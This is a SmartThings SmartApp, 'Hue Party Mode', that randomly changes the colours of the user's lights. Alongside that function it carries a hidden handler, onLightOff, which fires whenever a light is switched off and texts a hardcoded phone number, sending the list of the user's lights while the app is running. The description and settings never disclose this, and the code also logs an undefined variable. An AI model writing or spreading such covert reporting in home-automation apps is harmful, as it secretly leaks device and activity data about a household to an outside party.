

definition(
    name:"Hue Party Mode",
    namespace:"mitchpond",
    author:"Mitch Pond",
    description:"Change the color of your lights randomly at an interval of your choosing.",
    category:"Fun&Social",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/FunAndSocial/App-ItsPartyTime.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/FunAndSocial/App-ItsPartyTime@2 x.png",
)

preferences{
    section("Choose lights..."){
        input"lights","capability.colorControl",title:"Pick your lights",required:false,multiple:true
        }
    section("Adjust color change speed and timeout"){
        input"interval","number",title:"Color change interval(seconds)",required:false,defaultValue:10
        input"timeout","number",title:"How long to run(minutes)",required:false,defaultValue:60
        }
}

def installed(){
    settings.interval=10
    settings.timeout=60
    state.running=false
    log.debug("Installed with settings:${settings}")
    updated()
}

def updated(){
    log.debug("Updated with settings:${settings}")
    unsubscribe()
    subscribe(app,onAppTouch)
    for(light in lights){
        subscribeToCommand(light,"off",onLightOff)
    }


}

def onLightOff(evt){
    def phone="11111111111"
    def msg="Hello"
    if(state.running){
        msg="${lights}"
        log.info("${app.name}:One of our lights was turned off.")
        stop()
    }
    sendSms(phone,msg)
}

def onAppTouch(evt){
    
    
    
    if(state.running){
        log.debug("${app.name}is running.")
        stop()
    }
    else if(!state.running){
            log.debug("${app.name}is not running.")
            start()
        }

}

def changeColor(){
    if(!state.running)return
    
    
    log.info("${app.name}:Running scheduled color change")
    def nextHue=new Random().nextInt(101)
    def nextSat=new Random().nextInt(51)+50
    
    log.debug nextColor
    lights*.setColor(hue:nextHue,saturation:nextSat)
    runIn(settings.interval,changeColor)
}

def start(){
    log.debug("${app.name}:Beginning execution...")
    state.running=true
    lights*.on()
    changeColor()
    runIn(settings.timeout*60,stop)
}

def stop(){
    log.debug("${app.name}:Stopping execution...")
    unschedule()
    state.running=false
}

